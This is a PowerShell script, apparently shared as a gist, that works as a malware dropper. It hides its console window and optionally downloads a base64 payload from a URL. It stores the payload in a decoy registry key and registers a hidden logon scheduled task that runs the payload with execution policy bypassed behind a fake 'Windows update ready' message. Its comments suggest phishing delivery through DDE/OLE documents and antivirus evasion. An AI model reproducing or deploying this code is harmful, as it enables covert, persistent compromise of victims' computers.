# powershell payload dropper written in powershell with persistence in registry and startup as scheduled task at logon for user.
# sample usage: inside Microsoft DDE, OLE dropper to send persistence invites for IT security courses for employee whose know your course already.
# use with av evasion always to be sure your courses has enough participants (I will link good power point tutorial later)
# https://gist.github.com/loadenmb/599e23be848d1cbb3d43aa04bc8369af
$regp = "securesoft";   # registry path / task name
$regn = "guard";        # registry key name / task name

# base64 encoded powershell payload or URL which output base64 encoded powershell
$payloadBase64 = "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsKJEZvcm0gPSBOZXctT2JqZWN0IHN5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm07CiRGb3JtLlRleHQgPSAiU2FtcGxlIEZvcm0iOwokTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsOwokTGFiZWwuVGV4dCA9ICJUaGlzIGZvcm0gaXMgdmVyeSBzaW1wbGUuIjsKJExhYmVsLkF1dG9TaXplID0gJFRydWU7CiRGb3JtLkNvbnRyb2xzLkFkZCgkTGFiZWwpOwokRm9ybS5TaG93RGlhbG9nKCk7Cg==";

# hide window via kernel32 (backup if powershell.exe is not called "-w hidden")
# .Net methods for hiding / showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
';
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);

# download base 64 payload from url if payload is url and not base64
if ($payloadBase64 -match "http:|https:") {
    $payloadBase64 = (New-Object "Net.Webclient").DownloadString($payloadBase64);
}

$installed = Get-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -ea SilentlyContinue;

# check if installed in registry
if ($installed) {

    # if current version differs previous use current
    if ($installed -ne $payloadBase64) {
        Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    }

# installation
} else {
    
    # save payload to registry
    if ($FALSE -eq (Test-Path -Path "HKCU:\Software\$($regp)\")) {
        New-Item -Path "HKCU:\Software\$($regp)";
    }
    Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    
    # get current user
    $u = [Environment]::UserName;
    
    # delete task if exists
    $task = Get-ScheduledTask -TaskName "$($regp)$($regn)" -ea SilentlyContinue;
    if ($task) {
        Unregister-ScheduledTask -TaskName "$($regp)$($regn)" -Confirm:$false;
    }
    
    # create task to start payload invisible at user logon via task scheduler
    $a = New-ScheduledTaskAction -Execute "powershell.exe" "-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\$($regp)).$($regn))));";
    $t = New-ScheduledTaskTrigger -AtLogOn -User "$($u)";
    $p = New-ScheduledTaskPrincipal "$($u)";
    $s = New-ScheduledTaskSettingsSet -Hidden;
    $d = New-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s;
    Register-ScheduledTask "$($regp)$($regn)" -InputObject $d;
}

# execute payload
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
